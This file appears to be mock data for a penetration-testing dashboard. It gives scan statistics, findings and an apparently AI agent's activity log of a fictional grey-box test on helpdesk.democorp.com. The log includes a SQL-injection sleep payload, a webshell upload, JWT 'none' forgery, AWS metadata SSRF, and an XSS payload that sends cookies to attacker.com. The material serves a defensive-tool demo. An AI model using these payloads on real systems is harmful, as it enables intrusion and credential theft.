export const orgStats = {
  org: "DemoCorp Security",
  owner: "Arjun Mehta",
  totalScans: 47,
  scheduled: 3,
  rescans: 8,
  failedScans: 2,
  lastUpdated: "2 mins ago",
};

export const severityStats = [
  { level: "Critical", count: 19, change: 3.1, direction: "up" },
  { level: "High",     count: 52, change: 6.4, direction: "up" },
  { level: "Medium",   count: 97, change: 2.3, direction: "down" },
  { level: "Low",      count: 121, change: 1.1, direction: "up" },
];

export const scans = [
  {
    id: "new",
    name: "New Scan",
    type: "Greybox",
    status: "In Progress",
    progress: 62,
    vuln: { critical: 3, high: 3, medium: 1, low: 1 },
    lastScan: "Now",
  },
  {
    id: "1",
    name: "Customer Portal Security Audit",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 4, high: 9, medium: 17, low: 22 },
    lastScan: "2h ago",
  },
  {
    id: "2",
    name: "API Gateway Penetration Test",
    type: "Blackbox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 2, high: 6, medium: 11, low: 14 },
    lastScan: "1d ago",
  },
  {
    id: "3",
    name: "Admin Panel Red Team Assessment",
    type: "Blackbox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 7, high: 14, medium: 23, low: 19 },
    lastScan: "2d ago",
  },
  {
    id: "4",
    name: "Mobile App Backend Audit",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 1, high: 4, medium: 8, low: 11 },
    lastScan: "3d ago",
  },
  {
    id: "5",
    name: "Payment Service Security Review",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 3, high: 8, medium: 12, low: 9 },
    lastScan: "4d ago",
  },
  {
    id: "6",
    name: "Employee SSO & Identity Provider",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 1, high: 2, medium: 7, low: 13 },
    lastScan: "5d ago",
  },
  {
    id: "7",
    name: "Internal HR Platform",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 0, high: 3, medium: 9, low: 27 },
    lastScan: "6d ago",
  },
  {
    id: "8",
    name: "CDN & Edge Node Configuration",
    type: "Greybox",
    status: "Completed",
    progress: 100,
    vuln: { critical: 0, high: 1, medium: 5, low: 8 },
    lastScan: "7d ago",
  },
  {
    id: "9",
    name: "Cloud Storage Access APIs",
    type: "Blackbox",
    status: "Scheduled",
    progress: 0,
    vuln: { critical: null, high: null, medium: null, low: null },
    lastScan: "Mar 5",
  },
  {
    id: "10",
    name: "Dev & Staging Environment",
    type: "Greybox",
    status: "Scheduled",
    progress: 0,
    vuln: { critical: null, high: null, medium: null, low: null },
    lastScan: "Mar 7",
  },
  {
    id: "11",
    name: "Supplier Integration APIs",
    type: "Blackbox",
    status: "Scheduled",
    progress: 0,
    vuln: { critical: null, high: null, medium: null, low: null },
    lastScan: "Mar 9",
  },
  {
    id: "12",
    name: "Legacy ERP Integration Layer",
    type: "Blackbox",
    status: "Failed",
    progress: 23,
    vuln: { critical: 0, high: 2, medium: 5, low: 3 },
    lastScan: "1d ago",
  },
  {
    id: "13",
    name: "IoT Device Management Platform",
    type: "Blackbox",
    status: "Failed",
    progress: 41,
    vuln: { critical: 1, high: 3, medium: 4, low: 2 },
    lastScan: "3d ago",
  },
];

export const activeScan = {
  id: "new",
  project: "Private Assests",
  name: "New Scan",
  status: "In Progress",
  progress: 62,
  steps: ["Spidering", "Mapping", "Testing", "Validating", "Reporting"],
  activeStep: 2,
  scanType: "Grey Box",
  targets: "helpdesk.democorp.com",
  startedAt: "Mar 3, 09:00 AM",
  credentials: "3 Active",
  files: "scope-definition.pdf",
  checklists: "218/350",
};

// Each segment: { text, type: 'normal'|'url'|'code'|'path'|'bold' }
export const activityLog = [
  {
    time: "09:00:14",
    segments: [
      { text: "I'll begin a systematic grey-box penetration test on ", type: "normal" },
      { text: "helpdesk.democorp.com", type: "url" },
      { text: ". Starting with passive reconnaissance and DNS enumeration.", type: "normal" },
    ],
  },
  {
    time: "09:01:32",
    segments: [
      { text: "Target is online. Resolved to ", type: "normal" },
      { text: "203.0.113.47", type: "code" },
      { text: ". Running port scan across common service ranges.", type: "normal" },
    ],
  },
  {
    time: "09:02:50",
    segments: [
      {
        text: "Port scan results:\n  - 80/tcp  open  Apache httpd 2.4.65\n  - 443/tcp open  Apache httpd 2.4.65 (TLS 1.2)\n  - 22/tcp  open  OpenSSH 8.9\n  - 3306/tcp open  MySQL 8.0\nProceeding to web server enumeration.",
        type: "normal",
      },
    ],
  },
  {
    time: "09:04:11",
    segments: [
      { text: "Spidered application. Discovered ", type: "normal" },
      { text: "143", type: "bold" },
      { text: " unique endpoints. Notable paths: ", type: "normal" },
      { text: "/admin", type: "path" },
      { text: ", ", type: "normal" },
      { text: "/api/v2", type: "path" },
      { text: ", ", type: "normal" },
      { text: "/password/reset", type: "path" },
      { text: ". Checking for login surfaces.", type: "normal" },
    ],
  },
  {
    time: "09:05:29",
    segments: [
      { text: "Found login page at ", type: "normal" },
      { text: "/auth/login", type: "path" },
      { text: ". HTML comment visible in source: ", type: "normal" },
      { text: '"TODO: Delete the testing account (test:test)"', type: "url" },
      { text: ". Attempting credential against the login form.", type: "normal" },
    ],
  },
  {
    time: "09:06:44",
    segments: [
      { text: "Login succeeded with ", type: "normal" },
      { text: "test:test", type: "code" },
      { text: ". Session redirected to ", type: "normal" },
      { text: "/password/test", type: "path" },
      { text: ". Response sets cookie ", type: "normal" },
      { text: "session_id", type: "code" },
      { text: " without HttpOnly or Secure flags.", type: "normal" },
    ],
  },
  {
    time: "09:08:02",
    segments: [
      { text: "Dashboard shows user profile header with ", type: "normal" },
      { text: "X-UserId: 10032", type: "code" },
      { text: " in request. Modifying to ", type: "normal" },
      { text: "X-UserId: 10001", type: "code" },
      { text: " returns another user's dashboard — ", type: "normal" },
      { text: "IDOR vulnerability confirmed", type: "bold" },
      { text: ".", type: "normal" },
    ],
  },
  {
    time: "09:10:18",
    segments: [
      { text: "Testing ", type: "normal" },
      { text: "/api/v2/users/profile?id=10001", type: "path" },
      { text: " with sleep-based payload: ", type: "normal" },
      { text: "' AND SLEEP(5)--", type: "code" },
      { text: ". Response delayed by ~5s. ", type: "normal" },
      { text: "Blind SQL injection confirmed", type: "bold" },
      { text: " on the profile endpoint.", type: "normal" },
    ],
  },
  {
    time: "09:13:45",
    segments: [
      {
        text: "Extracted database schema via time-based exfiltration. Tables found:\n  - users (id, email, password_hash, role)\n  - tickets (id, user_id, body, status)\n  - sessions (token, user_id, created_at)\nDumping admin credentials.",
        type: "normal",
      },
    ],
  },
  {
    time: "09:16:07",
    segments: [
      { text: "Recovered admin hash: ", type: "normal" },
      { text: "$2b$10$e3Kz...5aQ", type: "code" },
      { text: ". Cracked with rockyou.txt in 4 seconds — password: ", type: "normal" },
      { text: "Admin@1234", type: "code" },
      { text: ". Logging into admin panel at ", type: "normal" },
      { text: "/admin/dashboard", type: "path" },
      { text: ".", type: "normal" },
    ],
  },
  {
    time: "09:19:30",
    segments: [
      { text: "Admin panel has file upload at ", type: "normal" },
      { text: "/admin/uploads", type: "path" },
      { text: ". Content-Type validation only. Uploading PHP webshell with ", type: "normal" },
      { text: "Content-Type: image/png", type: "code" },
      { text: " header bypass.", type: "normal" },
    ],
  },
  {
    time: "09:21:48",
    segments: [
      { text: "Webshell uploaded to ", type: "normal" },
      { text: "/uploads/img_20240303.php", type: "path" },
      { text: ". Executing ", type: "normal" },
      { text: "id", type: "code" },
      { text: " command — response: ", type: "normal" },
      { text: "uid=33(www-data) gid=33(www-data)", type: "code" },
      { text: ". ", type: "normal" },
      { text: "Remote code execution confirmed", type: "bold" },
      { text: ".", type: "normal" },
    ],
  },
  {
    time: "09:25:12",
    segments: [
      { text: "Checking JWT authentication on ", type: "normal" },
      { text: "/api/v2/auth/token", type: "path" },
      { text: ". Token header uses ", type: "normal" },
      { text: '"alg": "HS256"', type: "code" },
      { text: ". Testing ", type: "normal" },
      { text: '"alg": "none"', type: "code" },
      { text: " bypass — server accepts unsigned token. ", type: "normal" },
      { text: "JWT algorithm confusion confirmed", type: "bold" },
      { text: ".", type: "normal" },
    ],
  },
  {
    time: "09:28:44",
    segments: [
      { text: "Forged token with ", type: "normal" },
      { text: '"role": "superadmin"', type: "code" },
      { text: ". Accessing ", type: "normal" },
      { text: "/api/v2/admin/users", type: "path" },
      { text: " — returns full user database (", type: "normal" },
      { text: "9,847 records", type: "bold" },
      { text: ") including plaintext API keys.", type: "normal" },
    ],
  },
  {
    time: "09:31:05",
    segments: [
      { text: "Testing XSS on ticket submission form at ", type: "normal" },
      { text: "/tickets/new", type: "path" },
      { text: ". Injecting ", type: "normal" },
      { text: '<script>document.location="//attacker.com/c?c="+document.cookie</script>', type: "code" },
      { text: " in body field — payload stored and rendered unescaped in agent view.", type: "normal" },
    ],
  },
  {
    time: "09:33:19",
    segments: [
      { text: "Stored XSS triggers on agent dashboard load. Session cookie exfiltrated to attacker server. ", type: "normal" },
      { text: "Stored XSS confirmed — agent account takeover possible", type: "bold" },
      { text: ".", type: "normal" },
    ],
  },
  {
    time: "09:35:02",
    segments: [
      { text: "Testing SSRF via webhook URL parameter in notification settings: ", type: "normal" },
      { text: "/api/v2/notifications/webhook?url=http://169.254.169.254/latest/meta-data/", type: "path" },
      { text: ". Response contains AWS instance metadata.", type: "normal" },
    ],
  },
  {
    time: "09:36:14",
    segments: [
      { text: "SSRF pivot successful. Retrieved ", type: "normal" },
      { text: "iam/security-credentials/ec2-role", type: "path" },
      { text: " with temporary AWS access keys. ", type: "normal" },
      { text: "Cloud metadata SSRF confirmed", type: "bold" },
      { text: ". Keys valid for ~6 hours.", type: "normal" },
    ],
  },
  {
    time: "09:37:01",
    segments: [
      {
        text: "Summary of Testing phase complete. Critical attack chains identified:\n  1. SQLi → credential dump → admin access\n  2. File upload → RCE → server compromise\n  3. JWT none-alg → privilege escalation → data exfil\nMoving to validation phase.",
        type: "normal",
      },
    ],
  },
  {
    time: "09:37:22",
    segments: [
      { text: "Initiating automated verification of all ", type: "normal" },
      { text: "8 findings", type: "bold" },
      { text: ". Running parallel sub-agents for confirmation and PoC capture.", type: "normal" },
    ],
  },
];

export const verificationLoops = [
  {
    time: "09:38:00",
    segments: [
      { text: "Verifying IDOR on ", type: "normal" },
      { text: "/api/v2/users/{id}", type: "path" },
      { text: ". Iterating user IDs 10001–10100 with session token of user 10032.", type: "normal" },
    ],
  },
  {
    time: "09:39:11",
    segments: [
      { text: "IDOR confirmed: ", type: "normal" },
      { text: "94/100", type: "bold" },
      { text: " user records accessible without authorization. PII exposed: name, email, phone, address.", type: "normal" },
    ],
  },
  {
    time: "09:40:28",
    segments: [
      { text: "Verifying blind SQLi on ", type: "normal" },
      { text: "/api/v2/users/profile", type: "path" },
      { text: ". Running 10 sleep-based payloads to rule out false positives.", type: "normal" },
    ],
  },
  {
    time: "09:41:45",
    segments: [
      { text: "SQLi confirmed across ", type: "normal" },
      { text: "10/10", type: "bold" },
      { text: " payloads. Average delay 4.97s. Severity: ", type: "normal" },
      { text: "CRITICAL", type: "bold" },
      { text: ". PoC and dump screenshot captured.", type: "normal" },
    ],
  },
  {
    time: "09:43:02",
    segments: [
      { text: "RCE webshell re-verified. Command output for ", type: "normal" },
      { text: "uname -a", type: "code" },
      { text: ": ", type: "normal" },
      { text: "Linux helpdesk-prod 5.15.0-1034-aws #38-Ubuntu x86_64", type: "code" },
      { text: ". Full server compromise confirmed. All 8 findings validated.", type: "normal" },
    ],
  },
];

export const findings = [
  {
    id: 1,
    severity: "Critical",
    time: "09:10:18",
    title: "Blind SQL Injection in User Profile Endpoint",
    endpoint: "/api/v2/users/profile",
    description:
      "Time-based blind SQL injection confirmed on the 'id' query parameter. Exploitation allows full database read access including credential extraction. Verified with 10 distinct payloads producing consistent 5-second delays.",
  },
  {
    id: 2,
    severity: "Critical",
    time: "09:21:48",
    title: "Remote Code Execution via Unrestricted File Upload",
    endpoint: "/admin/uploads",
    description:
      "Server-side file type validation relies solely on the Content-Type header. Uploading a PHP webshell with a spoofed image MIME type grants unauthenticated OS-level command execution as www-data.",
  },
  {
    id: 3,
    severity: "Critical",
    time: "09:25:12",
    title: "JWT Algorithm Confusion — Unsigned Token Accepted",
    endpoint: "/api/v2/auth/token",
    description:
      'The authentication service accepts JWTs with "alg": "none", bypassing signature verification entirely. An attacker can forge arbitrary role claims and escalate to superadmin privileges without valid credentials.',
  },
  {
    id: 4,
    severity: "High",
    time: "09:08:02",
    title: "Insecure Direct Object Reference on User Dashboards",
    endpoint: "/api/v2/users/{id}",
    description:
      "The X-UserId header is trusted without server-side authorization checks. Any authenticated user can access or modify the profile data of any other user by changing the header value. 94 of 100 tested IDs were accessible.",
  },
  {
    id: 5,
    severity: "High",
    time: "09:33:19",
    title: "Stored Cross-Site Scripting in Ticket Submission",
    endpoint: "/tickets/new",
    description:
      "User-supplied input in the ticket body field is stored and rendered without HTML encoding in the agent dashboard. A malicious payload can exfiltrate agent session cookies, enabling full account takeover of support staff.",
  },
  {
    id: 6,
    severity: "High",
    time: "09:36:14",
    title: "Server-Side Request Forgery via Webhook URL Parameter",
    endpoint: "/api/v2/notifications/webhook",
    description:
      "The webhook notification URL is fetched server-side without allowlist validation. Attacker can pivot to the AWS instance metadata service at 169.254.169.254 and retrieve temporary IAM credentials.",
  },
  {
    id: 7,
    severity: "Medium",
    time: "09:06:44",
    title: "Session Cookie Missing HttpOnly and Secure Flags",
    endpoint: "/auth/login",
    description:
      "Authentication cookies are issued without the HttpOnly or Secure attributes. Combined with the stored XSS finding, this directly enables session hijacking over unencrypted connections and via JavaScript access.",
  },
  {
    id: 8,
    severity: "Low",
    time: "09:05:29",
    title: "Credentials Exposed in HTML Comment",
    endpoint: "/auth/login",
    description:
      'A developer comment in the login page source reads: "TODO: Delete the testing account (test:test)". These credentials are valid and grant authenticated access to the application, serving as the initial entry point for this engagement.',
  },
];

export const statusBarData = {
  subAgents: 3,
  parallelExecutions: 5,
  operations: 12,
  critical: 3,
  high: 3,
  medium: 1,
  low: 1,
};
